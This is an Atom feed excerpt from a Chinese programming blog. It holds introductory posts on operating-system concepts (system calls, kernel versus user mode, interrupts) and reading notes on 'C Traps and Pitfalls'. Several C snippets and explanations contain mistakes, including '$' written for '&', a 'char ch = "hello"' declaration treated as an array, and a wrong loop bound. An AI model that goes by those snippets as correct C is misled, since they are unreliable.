    <link href="http://yoursite.com/2018/04/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <id>http://yoursite.com/2018/04/28/操作系统-一些基本概念/</id>
    <published>2018-04-28T10:21:30.000Z</published>
    <updated>2018-04-28T04:03:57.368Z</updated>
    
    <content type="html"><![CDATA[<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>操作系统是一个系统程序，即为别的程序提供服务的程序。那么，操作系统的服务是通过什么方式提供的呢？答案就是：<code>系统调用（System Call）</code>。</p>
<p>所谓系统调用就是：操作系统提供的API，用户通过调用这些API即可获得操作系统的服务。（想想是不是跟我们现在所作的什么Web Service、WCF、WebAPI、开放API之类的一致？）例如，如果用户程序需要进行读磁盘的操作，在C程序代码中可以使用如下语句来操作：<br><code>result = read(fd, buffer, nbytes);</code></p>
<p>这个read函数是C语言提供的库函数，而这个库函数本身则是调用的操作系统的read系统调用。具体的系统调用过程不是我们讨论的重点，但我们还是可以通过下图来看看这个read系统调用的过程。</p>
<p><img src="/images/操作系统-一些基本概念01.jpg" alt="系统调用"></p>
<p><strong>对于上图中的用户空间和内核空间是什么意思呢？</strong>请往下看。</p>
<h4 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h4><p>系统调用说白了就是一个应用程序申请操作系统的服务，既然是要调用操作系统的服务，那么是怎么从普通的应用程序切换到操作系统中运行的呢？</p>
<p>答案是 <code>int指令</code>,这是一个汇编的指令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int指令</div><div class="line"></div><div class="line">格式：int n</div><div class="line"></div><div class="line">n为中断类型码，它的功能是引发中断过程。</div><div class="line"></div><div class="line">CPU执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下：</div><div class="line">1）取中断类型码n；</div><div class="line">2）标志寄存器入栈，IF=0，TF=0；</div><div class="line">3）CS、IP入栈</div><div class="line">4）（IP）=（n*4），(CS)=(n*4+2)</div></pre></td></tr></table></figure>
<h3 id="内核态与用户态"><a href="#内核态与用户态" class="headerlink" title="内核态与用户态"></a>内核态与用户态</h3><blockquote>
<p>残酷的现实：世界上的人并非都是平等的，有些人生来占有的资源就多，而有的人占有的资源就很少。当有些人来了，其他人就得让出资源。程序亦是如此。</p>
</blockquote>
<p>操作系统作为计算机的管理者，享有着更多的方便或权限。为了区分不同的程序的不同权限，人们发明了内核态和用户态的概念。</p>
<h4 id="两种状态的概念"><a href="#两种状态的概念" class="headerlink" title="两种状态的概念"></a>两种状态的概念</h4><p>内核态就是拥有资源多的状态（或访问资源多的状态），也称为特权态。而用户态则是非特权态，在用户态下访问的资源会受到限制。例如，要访问OS的<code>内核数据结构</code>，如<code>进程表</code>等，则需要在特权态下才能做到。如果任意一个程序都能访问到这些数据，并有操作的能力，那整个操作系统是及其不安全、不稳定的。如果只需要访问用户程序里的数据，则在用户态下就可以了。</p>
<h4 id="两种状态的优势"><a href="#两种状态的优势" class="headerlink" title="两种状态的优势"></a>两种状态的优势</h4><ul>
<li>内核态：访问资源多，但可靠性、安全性要求高，维护管理都比较复杂；</li>
<li>用户态：访问资源有限，但可靠性、安全性要求低，维护起来比较简单；</li>
</ul>
<p>那么，一个程序到底应该运行在内核态还是用户态呢？这取决于其对资源和效率的需求；下图展示了Windows操作系统的内核态与用户态的界限，我们可以看到哪些需要在内核态下运行，哪些只在用户态下运行。</p>
<p><img src="/images/操作系统-一些基本概念02.jpg" alt="运行状态"></p>
<h4 id="两种状态的本质"><a href="#两种状态的本质" class="headerlink" title="两种状态的本质"></a>两种状态的本质</h4><p>计算机对于内核态和用户态的识别是通过CPU的一个状态位来实现的，这个状态位是CPU状态字里面的一个字位。所谓的用户态、内核态实际是CPU的一种状态，而不是程序的状态。通过设置该状态字，可以使CPU处于内核态、用户态或者其他的子态（有的CPU有更多种子态）。</p>
<p>换句话说：一个程序运行时，CPU是什么态，这个程序就运行在什么态。</p>
<p>那么，知道了是怎么实现的，那又是如何对用户态的访问进行限制的呢？在对用户态下程序执行的每一条指令进行检查，这种检查又被称为地址翻译，即对程序发出的每一条指令都要经过这个地址翻译过程（你可以将其理解为我们在实际开发中所作的权限管理，对用户发出的每个操作请求首先都经过一个Filter进行过滤），通过对翻译的控制，就可以限制程序对资源的访问。</p>
<h3 id="中断机制"><a href="#中断机制" class="headerlink" title="中断机制"></a>中断机制</h3><p>操作系统是为其他程序服务的，操作系统需要管理进程、内存、磁盘等，就是管理在内存中的程序，为其分配运行的空间、资源，所以操作系统要统一管理这些资源。所以说一个应用程序需要请求硬盘读写操作或申请内存空间，都需要通知操作系统，然后操作系统为其分配，这也是为什么要分用户态和内核态的原因。</p>
<p>那么用户态的程序是怎么通知操作系统的呢？答案就是<code>中断机制</code>。</p>
<p>中断是计算机里面的一个最为重要的机制，它也是操作系统获得计算机控制权的根本保证。其基本原理是：设备在完成自己的任务后向CPU发出终端，CPU判断优先级，然后确定是否响应。如果响应，则执行中断服务程序，并在中断服务程序执行完后继续执行原来的程序。下图简单地描述了中断机制：</p>
<p><img src="/images/操作系统-一些基本概念03.jpg" alt="中断机制"></p>
<p><a href="http://www.cnblogs.com/edisonchou/p/4999362.html" target="_blank" rel="external">一些基本概念</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;系统调用&quot;&gt;&lt;a href=&quot;#系统调用&quot; class=&quot;headerlink&quot; title=&quot;系统调用&quot;&gt;&lt;/a&gt;系统调用&lt;/h3&gt;&lt;p&gt;操作系统是一个系统程序，即为别的程序提供服务的程序。那么，操作系统的服务是通过什么方式提供的呢？答案就是：&lt;code&gt;系统调
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|关于操作系统</title>
    <link href="http://yoursite.com/2018/04/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoursite.com/2018/04/28/操作系统-关于操作系统/</id>
    <published>2018-04-28T09:57:44.000Z</published>
    <updated>2018-04-28T04:07:16.473Z</updated>
    
    <content type="html"><![CDATA[<h2 id="操作系统是什么？"><a href="#操作系统是什么？" class="headerlink" title="操作系统是什么？"></a>操作系统是什么？</h2><h3 id="两个问题"><a href="#两个问题" class="headerlink" title="两个问题"></a>两个问题</h3><h4 id="操作系统到底是什么鬼？"><a href="#操作系统到底是什么鬼？" class="headerlink" title="操作系统到底是什么鬼？"></a>操作系统到底是什么鬼？</h4><p>操作系统是介于计算机和应用软件之间的一个软件系统[<strong>也是一种软件噢</strong>]，操作系统的上层和下层都有其他的对象存在：</p>
<p><img src="/images/操作系统-关于操作系统01.jpg" alt="OS"></p>
<p>从上图可以看出，OS上边是应用软件，下边是硬件平台。</p>
<h4 id="操作系统到底操控什么事？"><a href="#操作系统到底操控什么事？" class="headerlink" title="操作系统到底操控什么事？"></a>操作系统到底操控什么事？</h4><p>最原始的计算机并没有OS，直接由人来掌管事情。随着计算机复杂性的增长，人已经不能胜任直接掌控计算机了。于是，OS这个软件被编写出来帮我们掌控计算机，使人类从日益复杂的掌控任务中解脱出来。既然OS是专门掌控计算机的，那么计算机上发生的所有事情都需要OS的知晓和认可，未经OS同意的任何事情均被视为非法的（想想病毒和入侵攻击者试图做的事情）。</p>
<h3 id="两种角色"><a href="#两种角色" class="headerlink" title="两种角色"></a>两种角色</h3><ul>
<li>魔术家</li>
</ul>
<p><img src="/images/操作系统-关于操作系统02.jpg" alt="魔术家"></p>
<p>魔术家的目标是把差的东西变好，把少的东西变多，把复杂变简单。同样，OS将计算机以一个更加容易、更加方便、更加强大的方式呈现给用户。</p>
<blockquote>
<p>Example：OS通过进程抽象让每一个用户感觉有一台自己独享的CPU，通过虚拟内存抽象，让用户感觉物理内存空间具有无限扩张性，这就是把少变多的一个实例。</p>
</blockquote>
<ul>
<li>管理者</li>
</ul>
<p><img src="/images/操作系统-关于操作系统03.jpg" alt="管理者"></p>
<p>操作系统管理计算机上的软硬件资源，如CPU、内存、磁盘等，使得不同用户之间或者同一用户的不同程序之间可以安全有序地共享这些硬件资源。</p>
<p>那么，问题来了，如何让用户很好地利用这些硬件资源呢？这就是分块（Parcel Out），把硬件分块给应用程序使用。这就涉及到有效和公平的原则，这也是一个管理者的必备素质，更是设计操作系统时的不懈追求！</p>
<p>操作系统的两个角色之间既有区别又有联系，为了完成不同的任务，OS有时需要扮演魔术师，有时有需要扮演管理者，还有时需要同时扮演两个角色。</p>
<h2 id="操作系统的范畴"><a href="#操作系统的范畴" class="headerlink" title="操作系统的范畴"></a>操作系统的范畴</h2><h3 id="CPU管理"><a href="#CPU管理" class="headerlink" title="CPU管理"></a>CPU管理</h3><p>即如何分配CPU给不同应用和用户，对于进程管理坚持三个目标：一是公平（每个程序都有机会使用CPU），二是非阻塞（任何程序不能无休止地阻挠其他程序的正常推进），三是优先级（优先级高的程序开始运行则优先级低的就需要让出资源—&gt;让一部分人先富起来）。</p>
<h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><p>即如何分配内存给不同应用和用户，主要管理缓存、主存、磁盘、磁带等存储介质所形成的内存架构。其目的主要有二：一是将少变多（比如虚拟内存的使用能够使得运行程序的大小大大地增加），二是让多个程序共享同一个物理内存（这就需要对物理内存进行分割和保护，不让一个程序访问另一个程序所占的内存空间，专业术语称为运行时不能越界访问）。</p>
<h3 id="外存管理"><a href="#外存管理" class="headerlink" title="外存管理"></a>外存管理</h3><p>即如何分配外存（磁盘）给不同应用和用户，外存管理也称存储管理，也就是我们所说的文件系统，其目的是将磁盘变为一个很容易使用的存储介质以提供给用户使用。</p>
<h3 id="I-O管理"><a href="#I-O管理" class="headerlink" title="I/O管理"></a>I/O管理</h3><p>即如何分配输入输出设备给应用和用户，也称为设备管理，也就是管理输入输出设备。其目的主要有两个：一是屏蔽不同设备的差异性（用户用同样的方式访问不同的设备，从而减低编程的难度），二是提供并发访问（即将那些看上去并不具备共享特征的设备如打印机变得可以共享）。</p>
<p>操作系统的四个核心功能如下图所示：</p>
<p><img src="/images/操作系统-关于操作系统04.jpg" alt="操作系统核心功能"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>操作系统的技巧也应用于很多领域，如抽象、缓存、并发等。操作系统简单说来就是实现抽象：<code>进程抽象</code>、<code>文件抽象</code>、<code>虚拟存储抽象</code>等。而很多领域都会使用抽象，例如数据结构和程序设计（抽象数据类型？抽象类？）；很多地方也会用到缓存，例如开发Web应用程序时使用缓存降低数据库访问压力，加快页面响应速度等等。更为重要的是，对于一个程序员来说，要想知道计算机在软件层面是怎么运转的，就得学习操作系统。</p>
<h2 id="程序是如何运行的？"><a href="#程序是如何运行的？" class="headerlink" title="程序是如何运行的？"></a>程序是如何运行的？</h2><h3 id="程序运行的四大要素"><a href="#程序运行的四大要素" class="headerlink" title="程序运行的四大要素"></a>程序运行的四大要素</h3><ol>
<li><p>程序设计语言<br>首先，我们得使用一门程序设计语言进行编程，一般我们使用的都是高级程序设计语言（如C、C++、Java、C#等）。</p>
</li>
<li><p>编译系统<br>我们写好了代码，但是由于计算机不认识高级语言编写的程序，需要编译成计算机能够识别的机器语言，这就需要编译器和汇编器的帮助。</p>
</li>
<li><p>操作系统<br>机器语言程序需要加载到内存，才能形成一个运动中的程序（即进程），这就需要操作系统的帮助。</p>
<blockquote>
<p>about：进程需要在计算机芯片即CPU上执行才算是真正在执行，而将进程调度到CPU上运行也是由操作系统完成的，这里也就不难理解为什么进程管理会在我们的教科书中排在最重要的位置了。</p>
</blockquote>
</li>
<li><p>指令集结构（计算机硬件系统）<br>在CPU上执行的机器语言指令需要变成能够在一个个时钟脉冲里执行的基本操作，这就需要指令集结构和计算机硬件的支持。</p>
</li>
</ol>
<h3 id="程序运行的基本流程"><a href="#程序运行的基本流程" class="headerlink" title="程序运行的基本流程"></a>程序运行的基本流程</h3><p>基于上面提到的四大要素，我们可以得出下面一幅图，该图从一个线性角度展示了程序的演变过程，能够帮助我们理解整个程序是如何在计算机上执行的。</p>
<p><img src="/images/操作系统-关于操作系统05.jpg" alt="程序运行"></p>
<p>事实上，程序可以执行在机器语言或汇编语言上编写，用这种被称为“低级”（我更愿意称其为底层）的语言编写出来的机器语言程序无需经过编译器的翻译就可以在计算机指令集上执行。如果是在汇编语言上编写的汇编程序，则只需要经过汇编器的翻译即可加载执行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;操作系统是什么？&quot;&gt;&lt;a href=&quot;#操作系统是什么？&quot; class=&quot;headerlink&quot; title=&quot;操作系统是什么？&quot;&gt;&lt;/a&gt;操作系统是什么？&lt;/h2&gt;&lt;h3 id=&quot;两个问题&quot;&gt;&lt;a href=&quot;#两个问题&quot; class=&quot;headerlink&quot; 
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>读书笔记|C陷阱与缺陷</title>
    <link href="http://yoursite.com/2018/04/24/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-C%E9%99%B7%E9%98%B1%E4%B8%8E%E7%BC%BA%E9%99%B7/"/>
    <id>http://yoursite.com/2018/04/24/读书笔记-C陷阱与缺陷/</id>
    <published>2018-04-23T19:57:59.000Z</published>
    <updated>2018-05-01T16:20:54.767Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-导读"><a href="#0-导读" class="headerlink" title="0|导读"></a>0|导读</h2><p>程序设计错误实际上反映的是程序与程序员对该程序的“心智模式”两者的相异之处。</p>
<h2 id="1-词法陷阱"><a href="#1-词法陷阱" class="headerlink" title="1|词法陷阱"></a>1|词法陷阱</h2><p>第一章，将程序代码看成是有符号构成的字符序列，把自己想象成是c语言的“词法分析器”，看看相同的字符序列，在不同的上下文环境中，会发生那些有意思的事情。</p>
<h3 id="不同于"><a href="#不同于" class="headerlink" title="=不同于=="></a>=不同于==</h3><p>在c语言中，符号=作为赋值运算，符号==作为比较。由于这两个符号很相似，稍不留神就会犯错误，少一个 = 或者多一个 = ，都会造成错误。</p>
<p>当我们本意是作比较运算时，却无意中多敲了一个 = 号时，就发生了错误。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(x = y) </div><div class="line">	break;</div></pre></td></tr></table></figure>
<p>本意是比较x与y,相等就break。而实际上是将y赋值给了x,然后检查该值是否为零，也就是y的值作为了判断的条件，不再是 x是否等于y为判断条件了。</p>
<p>需要注意的是，如果我们确实需要对变量进行赋值并检查该变量的新值是否为0时，请加括号。比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(x=y) </div><div class="line">	foo();</div><div class="line"></div><div class="line">请写成：</div><div class="line">if((x=y) != 0) </div><div class="line">	foo();</div></pre></td></tr></table></figure></p>
<p>这样的好处是程序的可读性强，同时避免犯错误。</p>
<p>当然，把比较赋值运算误写成比较运算，也会造成错误。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if((filedesc == open(argv[1],0)) &lt; 0)</div><div class="line">   error();</div></pre></td></tr></table></figure>
<p>本意是将函数open（）的返回值赋值给 filedesc ，然后比较filedesc 与 1 的值，判断函数是否执行成功。但现在变成了比较函数open()的返回值与变量filedesc，然后检查比较的结果是否小于0。实际的意思与本意有了很大的区别。</p>
<h3 id="和-不同于-和"><a href="#和-不同于-和" class="headerlink" title="$和|不同于$$和||"></a>$和|不同于$$和||</h3><p>这几个符号也是容易混淆的，要时刻记住 $和| 是算术符号，其作用是按位进行运算；$$和||是逻辑运算，其结果只能是 1 或 0 。</p>
<h3 id="词法分析中的“贪心发”"><a href="#词法分析中的“贪心发”" class="headerlink" title="词法分析中的“贪心发”"></a>词法分析中的“贪心发”</h3><p>c语言编译器理解构成程序的字符序列时，采取贪心规则：每一个符号应该包含尽可能多的字符。同时，需要注意，除了字符串与字符常量，符号的中间不能有空白（空格符、制表符、换行符）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a---b</div><div class="line">与表达式</div><div class="line">a -- - b </div><div class="line">的含义相同，而与</div><div class="line">a - -- b</div><div class="line">的含义不同</div></pre></td></tr></table></figure>
<p>还有要注意c语言中的注释符号 /* 。比如：</p>
<p><code>y = x/*p</code></p>
<p>本意是用x除以p指向的值，把所得的商赋值给 y ，但现在编译器将/<em> 匹配在了一起，理解成注释符号了，原意改变了。我们应该这样写：<br>`y = x/(</em>p)`</p>
<p>总的来说，要尽可能避免因编译器的“贪心法”匹配规则，把我们的程序理解成另一种意思。</p>
<h3 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h3><p>这主要讲的是编译器会把第一个字符是数字0的常量视为8进制数，而改变了我们原本像表示的意思。</p>
<h3 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a>字符与字符串</h3><p>c语言中单引号与双引号的含义是不同的，这也是我们常犯的错误。用单引号引起的是一个字符，实际上表示的是一个整数；用双引号引起的是字符串，代表的是一个指向无名数组起始字符的指针，该指针被双引号之间的字符以及一个额外的二进制值为0的字符’\0’初始化。</p>
<p><strong>第一章“词法陷阱”，从编译器的角度，一些相同的字符序列，可能会因编译器的识别规则，从而有不同的意思；还有就是混淆一些相似的符号的用法，造成错误。</strong></p>
<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p><strong>1.3</strong> 对于n–&gt;0,编译器根据贪心准则，会首先匹配a–,然后尝试 a–&gt;,这个不是合法的，就从 &gt; 开始匹配； &gt;0,不是合法的，所以最后的结果是 (a–)&gt;0。</p>
<p><strong>1.4</strong> 这个题最初的想法是((a++)++)+b ;又想到了另一种 (a++)+(++b);不过，放到编译器中时，不能编译通过。不过当写成 <code>a++ + ++b</code>是能编译通过，所以猜想意思是(a++)+(++b)。</p>
<h2 id="2-词法陷阱"><a href="#2-词法陷阱" class="headerlink" title="2|词法陷阱"></a>2|词法陷阱</h2><h3 id="理解函数声明"><a href="#理解函数声明" class="headerlink" title="理解函数声明"></a>理解函数声明</h3><h3 id="运算符的优先级问题"><a href="#运算符的优先级问题" class="headerlink" title="运算符的优先级问题"></a>运算符的优先级问题</h3><p>C语言中有许多运算符，有逻辑运算符、算术运算符、移位运算符…不同的运算符的优先级是不一样的。</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>结合性</th>
</tr>
</thead>
<tbody>
<tr>
<td>()  []  -&gt; .</td>
<td>自左向右</td>
</tr>
<tr>
<td>!  ~ ++ – - (type) * &amp; sizeof</td>
<td>自右向左</td>
</tr>
<tr>
<td>*  / %</td>
<td>自左向右</td>
</tr>
<tr>
<td>+  -</td>
<td>自左向右</td>
</tr>
<tr>
<td>&lt;&lt;   &gt;&gt;</td>
<td>自左向右</td>
</tr>
<tr>
<td>&lt;  &lt;=  &gt;  &gt;=</td>
<td>自左向右</td>
</tr>
<tr>
<td>==  !=</td>
<td>自左向右</td>
</tr>
<tr>
<td>&amp;</td>
<td>自左向右</td>
</tr>
<tr>
<td>^</td>
<td>自左向右</td>
</tr>
<tr>
<td>(按位或)</td>
<td>自左向右</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>自左向右</td>
</tr>
<tr>
<td>或</td>
<td>自左向右</td>
</tr>
<tr>
<td>?：</td>
<td>自右向左</td>
</tr>
<tr>
<td>assignments</td>
<td>自右向左</td>
</tr>
<tr>
<td>,</td>
<td>自左向右</td>
</tr>
</tbody>
</table>
<p>如果不注意运算符的优先级，很可能会出现这样的错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">while(c = gitc(in) != EOF)</div><div class="line">	putc(c,out);</div></pre></td></tr></table></figure>
<p>例子本意是复制一个文件到另一个文件。在上述代码中，c似乎是先被赋予getc(in)的值，然后与EOF比较是否达到文件末尾。然而，由于赋值运算符的优先级小于比较运算符，所以实际表达的意思是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">while(c = (gitc(in) != EOF))</div><div class="line">	putc(c,out);</div></pre></td></tr></table></figure></p>
<p>与原意大相径庭了。</p>
<p>此外，还要注意运算符的结合性。如果p是指向一个函数的指针，要调用p所指向的函数，就必须要这样写：<code>(*p)()</code>。因为如果写成<code>*p()</code>，编译器会理解成 <code>*(p())</code>。在比如在单目运算符中，<code>*p++</code>会被编译成<code>*(p++)</code>,即取指针p所指向的对象，然后将p递增1，不是<code>(*p)++</code>的意思了。</p>
<h3 id="注意作为语句结束标志的分号"><a href="#注意作为语句结束标志的分号" class="headerlink" title="注意作为语句结束标志的分号"></a>注意作为语句结束标志的分号</h3><h4 id="多了一个分号"><a href="#多了一个分号" class="headerlink" title="多了一个分号"></a>多了一个分号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if(x[i] &gt; big);</div><div class="line">	big = x[i];</div><div class="line">    </div><div class="line">big = x[i]跟if就没有关系了，也就相当于：</div><div class="line">if(x[i] &gt; big) &#123;&#125;</div><div class="line">	big = x[i];</div></pre></td></tr></table></figure>
<h4 id="少了一个分号"><a href="#少了一个分号" class="headerlink" title="少了一个分号"></a>少了一个分号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">if(n&lt;3)</div><div class="line">	return</div><div class="line">str.date = a;</div><div class="line">str.date = b;</div><div class="line">str.date = c;</div><div class="line"></div><div class="line">这个就相当于:</div><div class="line"></div><div class="line">if(n&lt;3)</div><div class="line">	return str.date = a;</div><div class="line">str.date = b;</div><div class="line">str.date = c;</div></pre></td></tr></table></figure>
<p>缺少分号，编译器可能会发出警告的信息，但如果缺分号并不造成语法上的错误，编译器不会发出错误信息，同时，这样的bug极其不容易被发现，要注意这类bug。</p>
<h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><p>在switch中，要注意break的使用。c语言中，如果不显示写出break，程序会依次往下执行；如果真的是keyi刻意不写break，也应该注释一下，提高代码的可读性。</p>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>C语言中，无论函数需要参数与否，都需要加上()，不然编译器不会认为这是函数调用。</p>
<h3 id="“悬挂”else引发的问题"><a href="#“悬挂”else引发的问题" class="headerlink" title="“悬挂”else引发的问题"></a>“悬挂”else引发的问题</h3><p>这也是容易发生的bug,比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if( x == 0)</div><div class="line">	if( y == 0) error();</div><div class="line">else&#123;</div><div class="line">	z = x + y;</div><div class="line">    f(z);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>本意上，else是与第一个if配对的，但现在实际的意思是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if( x == 0)&#123;</div><div class="line">	if( y == 0) error();</div><div class="line">    else&#123;</div><div class="line">        z = x + y;</div><div class="line">        f(z);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>与原来的意思相差十万八千里。</p>
<h2 id="3-词义“陷阱”"><a href="#3-词义“陷阱”" class="headerlink" title="3|词义“陷阱”"></a>3|词义“陷阱”</h2><h3 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h3><p>关于c语言，需要注意的是：</p>
<ul>
<li>C语言中只有一维数组，数组大小在编译期就要明确。同时，数组的元素可以是任意类型的对象，可以是整数、结构体…任意的对象自然也还包括数组，所以就能根据这个“仿真”出多维数组。</li>
<li>对于数组，我们只能做两件事：<ul>
<li>确定大小</li>
<li>获得指向数组下标为0的指针</li>
</ul>
</li>
</ul>
<p>所以，我们知道我们对数组的操作，都是在通过操作指向数组下标为0的指针进行的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int a[3];</div><div class="line">int * p = a;</div><div class="line">print(&quot;%d&quot;,*p);</div></pre></td></tr></table></figure>
<p>上述例子会打印出 a[0] 的值，所以我们得知 <strong>数组名就是指向数组下标为0的元素的指针</strong>。在进一步，对于<code>p+1</code>，我们得到了数组下标为1的指针。总的来说，<code>*(a+i)</code>就是数组中下标为i的元素的引用。</p>
<p>那么在二维数组中，数组名指的是什么呢？前面的讨论中得知，二维数组就是以数组为元素的一维数组。看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int calendar [12][31];</div><div class="line">int *p;</div><div class="line">int i;</div></pre></td></tr></table></figure>
<p>calendar是一个有着12个数组类型元素的数组，它的每个数组类型元素又是一个有着31个整形元素的数组，所以<code>calendar[4]</code>是calendar数组的第五个元素，是calendar数组中12个有着31个整形元素的数组之一。</p>
<p>对于语句 <code>i =calendar[4][7]</code> 可以这样表达 <code>i=*(calendar[4]+7)</code>;那语句 <code>p = calendar</code>是什么意思呢？是正确的吗？</p>
<p><strong> <code>p = calendar</code>是非法的，因为calendar是二维数组，也就是“数组的数组”，calendar是数组名，是指向数组下标为0的元素的指针，那也就是说 calendar是指向一个数组的指针，但 p 是指向一个整形的指针。该语句试图将一种类型的指针赋值给另一种类型的指针，所以是非法的。</strong></p>
<p>所以可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">int calendar[12][31];</div><div class="line">int (*p)[31];</div><div class="line">p = calendar;</div></pre></td></tr></table></figure>
<p>一种根据指针的方式来操作数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int calendar[12][31];</div><div class="line">int (*p)[31];</div><div class="line"></div><div class="line">for(p = calendar;p &lt; &amp;calendar[12];p++)&#123;</div><div class="line">	int *t;</div><div class="line">    for(t = *p;t&lt;&amp;(*p);t++)</div><div class="line">    	*t = 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>对于指针，还有一点需要注意：如果ip指向一个整数，那么 <code>ip+1</code> 指向的是计算机内存中的下一个整数，在大多数现代计算机中，它都不同于ip所指向地址的下一个内存位置。</strong>对于数组，它的元素在内存中是连续的，所以<code>*(a+i)</code>就是数组中下标为i的元素的引用。</p>
<h3 id="非指针的数组"><a href="#非指针的数组" class="headerlink" title="非指针的数组"></a>非指针的数组</h3><p>这里主要讲的是字符串常量。在C语言中，字符串常量代表了一块包括字符串中所有字符以及一个空字符(‘\0)的内存区域的地址。所以字符串“hello”，在内存中的是以这样“hello\0”的状态存在的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">char ch = &quot;hello&quot;;</div></pre></td></tr></table></figure>
<p>对呀数组ch,它的元素个数是6。</p>
<h3 id="作为参数的数组声明"><a href="#作为参数的数组声明" class="headerlink" title="作为参数的数组声明"></a>作为参数的数组声明</h3><p>在这一节中，最主要讲的就是：如果我们使用数组名作为参数，那么实际上我们传的参数是指向该数组的第一个元素的指针。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">char hello[] = &quot;hello&quot;;</div><div class="line">printf(&quot;%s\n&quot;,hello);</div><div class="line">printf(&quot;%s\n&quot;,&amp;hello[0]);</div></pre></td></tr></table></figure>
<p>上述的两条打印语句是等效的。</p>
